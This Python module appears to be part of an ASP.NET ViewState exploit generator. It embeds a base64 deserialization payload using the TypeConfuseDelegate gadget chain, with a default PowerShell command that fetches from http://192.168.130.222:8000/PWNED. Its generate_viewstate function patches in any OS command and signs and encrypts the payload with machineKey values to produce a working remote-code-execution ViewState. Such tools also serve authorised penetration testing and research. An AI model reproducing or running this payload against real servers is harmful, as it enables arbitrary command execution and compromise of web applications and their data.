"""
gadgets.py — Payload surgery and the public generate_viewstate() API.

Contains the unsigned ObjectStateFormatter template implementing the classic
TypeConfuseDelegate + ComparisonComparer gadget chain, which culminates in
Process.Start("cmd.exe", "/c <command>") when deserialized by a vulnerable
ASP.NET application.
"""

from __future__ import annotations

import base64
from typing import List, Optional

from .crypto import (
    encrypt_and_sign,
    sp800_108_derivekey,
    sp800_108_get_key_derivation_parameters,
    write_vlq,
)

# ---------------------------------------------------------------------------
# Embedded unsigned ObjectStateFormatter payload
# (TypeConfuseDelegate + ComparisonComparer → Process.Start("cmd", "/c …"))
# The "/c <command>" string is located and replaced at runtime.
# ---------------------------------------------------------------------------
_UNSIGNED_B64 = (
    "/wEy7REAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0"
    "dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVt"
    "LkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGli"
    "LCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVj"
    "NTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3Rl"
    "bS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5n"
    "LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv"
    "a2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3Rl"
    "bS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5n"
    "LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv"
    "a2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNl"
    "cmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAASS9jIHBvd2Vyc2hlbGwgLWMgIml3"
    "ciBodHRwOi8vMTkyLjE2OC4xMzAuMjIyOjgwMDAvUFdORUQgLVVzZUJhc2ljUGFyc2luZyIGBwAA"
    "AANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0"
    "ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitE"
    "ZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9s"
    "ZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJ"
    "CQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0"
    "ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0"
    "VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVT"
    "ZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lz"
    "dGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQ"
    "dWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIs"
    "IFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1"
    "NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00"
    "LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODld"
    "XQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGlj"
    "S2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwg"
    "Q3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lz"
    "dGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxl"
    "Y3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1l"
    "CUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVu"
    "dHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdu"
    "b3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5T"
    "eXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3Ry"
    "aW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZ"
    "AAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0"
    "ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAI"
    "AAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZl"
    "cnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5"
    "MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw=="
)

DEFAULT_PURPOSE = "WebForms.HiddenFieldPageStatePersister.ClientState"
DEFAULT_SPECIFIC = [
    "TemplateSourceDirectory: /",
    "Type: System.Web.UI.Page",
]


def patch_command(payload: bytearray, cmd: str) -> bytearray:
    """
    Replace the embedded "/c <old>" string with "/c <newcmd>" and
    correctly update both the string-length VLQ and the outer stream-length VLQ.
    """
    marker = b"/c "
    i = payload.find(marker)
    if i < 1:
        raise RuntimeError("embedded '/c ' command marker not found in base payload")

    old_len = payload[i - 1]
    if old_len & 0x80:
        raise RuntimeError("unexpected multi-byte VLQ length for the original command")

    # new string = "/c " + cmd   → length = 3 + len(cmd)
    new_seq = write_vlq(len(cmd) + 3) + marker + cmd.encode("utf-8", errors="replace")
    payload[i - 1 : i + old_len] = new_seq

    # Fix the ObjectStateFormatter length field that sits right after the
    # 0xFF 0x01 header.  data_start is the first byte of the actual object data.
    data_start = 3 + len(write_vlq(len(payload) - 3))
    enc_len = write_vlq(len(payload) - data_start)
    if 3 + len(enc_len) != data_start:
        raise RuntimeError("VLQ size drift after command patch — payload is too large/small")
    payload[3 : 3 + len(enc_len)] = enc_len
    return payload


def generate_viewstate(
    command: str,
    validation_key: bytes,
    decryption_key: bytes,
    *,
    purpose: str = DEFAULT_PURPOSE,
    specific_purposes: Optional[List[str]] = None,
    legacy: bool = False,
    iv: Optional[bytes] = None,
) -> str:
    """
    Return a base64-encoded, signed & encrypted ViewState that will execute
    `command` via cmd.exe /c when deserialized.

    Parameters
    ----------
    command        : OS command to execute.
    validation_key : raw machineKey ValidationKey (hex-decoded bytes).
    decryption_key : raw machineKey DecryptionKey (hex-decoded bytes).
    purpose        : primary purpose string for SP800-108 derivation.
    specific_purposes : specific purpose strings for SP800-108 derivation.
    legacy         : if True, skip SP800-108 derivation (pre-4.5 behavior).
    iv             : optional fixed IV (testing only; random by default).
    """
    if specific_purposes is None:
        specific_purposes = list(DEFAULT_SPECIFIC)

    if not legacy:
        label, context = sp800_108_get_key_derivation_parameters(purpose, specific_purposes)
        decryption_key = sp800_108_derivekey(
            decryption_key, label, context, len(decryption_key) * 8
        )
        validation_key = sp800_108_derivekey(
            validation_key, label, context, len(validation_key) * 8
        )

    payload = bytearray(base64.b64decode(_UNSIGNED_B64))
    payload = patch_command(payload, command)
    protected = encrypt_and_sign(bytes(payload), decryption_key, validation_key, iv=iv)
    return base64.b64encode(protected).decode("ascii")
